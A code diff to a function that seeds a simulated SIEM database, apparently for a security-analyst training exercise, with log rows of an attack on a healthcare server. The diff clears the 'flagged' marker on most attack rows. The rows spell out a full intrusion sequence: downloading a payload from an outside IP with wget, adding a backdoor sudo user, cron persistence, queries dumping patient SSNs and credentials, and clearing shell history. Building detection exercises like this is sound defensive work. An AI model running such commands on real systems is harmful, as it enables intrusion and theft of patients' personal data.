@@ -1784,9 +1784,9 @@ async function initSiem() {
   // DB query log — malicious exfil queries (flagged)
   siemDB.run(`INSERT INTO db_query_log VALUES (1,'2026-05-18 02:19:04','root','SELECT * FROM patients LIMIT 1000',1000,1)`);
   siemDB.run(`INSERT INTO db_query_log VALUES (2,'2026-05-18 02:19:41','root','SELECT name, dob, ssn, insurance_id FROM patients WHERE billing_status = \"active\"',847,1)`);
-  siemDB.run(`INSERT INTO db_query_log VALUES (3,'2026-05-18 02:20:13','root','SELECT * FROM billing_records WHERE created_at > \"2026-01-01\"',2341,1)`);
-  siemDB.run(`INSERT INTO db_query_log VALUES (6,'2026-05-18 02:21:05','root','SHOW TABLES',8,1)`);
-  siemDB.run(`INSERT INTO db_query_log VALUES (7,'2026-05-18 02:21:33','root','SELECT * FROM user_credentials',12,1)`);
+  siemDB.run(`INSERT INTO db_query_log VALUES (3,'2026-05-18 02:20:13','root','SELECT * FROM billing_records WHERE created_at > \"2026-01-01\"',2341,0)`);
+  siemDB.run(`INSERT INTO db_query_log VALUES (6,'2026-05-18 02:21:05','root','SHOW TABLES',8,0)`);
+  siemDB.run(`INSERT INTO db_query_log VALUES (7,'2026-05-18 02:21:33','root','SELECT * FROM user_credentials',12,0)`);
 
   // DB query log — normal business queries (not flagged)
   siemDB.run(`INSERT INTO db_query_log VALUES (4,'2026-05-16 09:11:03','billing_service','SELECT invoice_id, amount, status FROM billing_records WHERE due_date = CURDATE()',12,0)`);
@@ -1803,15 +1803,15 @@ async function initSiem() {
 
   // Process log — attack sequence
   siemDB.run(`INSERT INTO process_log VALUES (1,'2026-05-18 02:14:38','clearpath-prod-01',3249,'root','wget -q http://185.220.101.42:8080/update_check -O /tmp/.update_check',1)`);
-  siemDB.run(`INSERT INTO process_log VALUES (2,'2026-05-18 02:14:41','clearpath-prod-01',3250,'root','chmod +x /tmp/.update_check',1)`);
-  siemDB.run(`INSERT INTO process_log VALUES (3,'2026-05-18 02:14:44','clearpath-prod-01',3251,'root','useradd -m -u 1004 -g 0 service_backup',1)`);
-  siemDB.run(`INSERT INTO process_log VALUES (4,'2026-05-18 02:14:46','clearpath-prod-01',3252,'root','usermod -aG sudo service_backup',1)`);
-  siemDB.run(`INSERT INTO process_log VALUES (5,'2026-05-18 02:14:50','clearpath-prod-01',3253,'root','echo "*/5 * * * * root /tmp/.update_check 2>/dev/null" > /etc/cron.d/service_backup_task',1)`);
-  siemDB.run(`INSERT INTO process_log VALUES (6,'2026-05-18 02:19:02','clearpath-prod-01',3289,'root','mysql -u root -p clearpath_db -e "SELECT * FROM patients LIMIT 1000"',1)`);
-  siemDB.run(`INSERT INTO process_log VALUES (7,'2026-05-18 02:19:39','clearpath-prod-01',3290,'root','mysql -u root -p clearpath_db -e "SELECT name, dob, ssn, insurance_id FROM patients WHERE billing_status = active"',1)`);
-  siemDB.run(`INSERT INTO process_log VALUES (8,'2026-05-18 02:20:11','clearpath-prod-01',3291,'root','mysql -u root -p clearpath_db -e "SELECT * FROM billing_records WHERE created_at > 2026-01-01"',1)`);
-  siemDB.run(`INSERT INTO process_log VALUES (9,'2026-05-18 02:21:30','clearpath-prod-01',3292,'root','mysql -u root -p clearpath_db -e "SELECT * FROM user_credentials"',1)`);
-  siemDB.run(`INSERT INTO process_log VALUES (10,'2026-05-18 02:22:01','clearpath-prod-01',3295,'root','history -c',1)`);
+  siemDB.run(`INSERT INTO process_log VALUES (2,'2026-05-18 02:14:41','clearpath-prod-01',3250,'root','chmod +x /tmp/.update_check',0)`);
+  siemDB.run(`INSERT INTO process_log VALUES (3,'2026-05-18 02:14:44','clearpath-prod-01',3251,'root','useradd -m -u 1004 -g 0 service_backup',0)`);
+  siemDB.run(`INSERT INTO process_log VALUES (4,'2026-05-18 02:14:46','clearpath-prod-01',3252,'root','usermod -aG sudo service_backup',0)`);
+  siemDB.run(`INSERT INTO process_log VALUES (5,'2026-05-18 02:14:50','clearpath-prod-01',3253,'root','echo "*/5 * * * * root /tmp/.update_check 2>/dev/null" > /etc/cron.d/service_backup_task',0)`);
+  siemDB.run(`INSERT INTO process_log VALUES (6,'2026-05-18 02:19:02','clearpath-prod-01',3289,'root','mysql -u root -p clearpath_db -e "SELECT * FROM patients LIMIT 1000"',0)`);
+  siemDB.run(`INSERT INTO process_log VALUES (7,'2026-05-18 02:19:39','clearpath-prod-01',3290,'root','mysql -u root -p clearpath_db -e "SELECT name, dob, ssn, insurance_id FROM patients WHERE billing_status = active"',0)`);
+  siemDB.run(`INSERT INTO process_log VALUES (8,'2026-05-18 02:20:11','clearpath-prod-01',3291,'root','mysql -u root -p clearpath_db -e "SELECT * FROM billing_records WHERE created_at > 2026-01-01"',0)`);
+  siemDB.run(`INSERT INTO process_log VALUES (9,'2026-05-18 02:21:30','clearpath-prod-01',3292,'root','mysql -u root -p clearpath_db -e "SELECT * FROM user_credentials"',0)`);
+  siemDB.run(`INSERT INTO process_log VALUES (10,'2026-05-18 02:22:01','clearpath-prod-01',3295,'root','history -c',0)`);
 
   // Process log — normal background activity
   siemDB.run(`INSERT INTO process_log VALUES (11,'2026-05-18 00:05:02','clearpath-prod-01',2901,'root','/usr/sbin/mysqldump clearpath_db --result-file=/var/backups/db_nightly.sql',0)`);
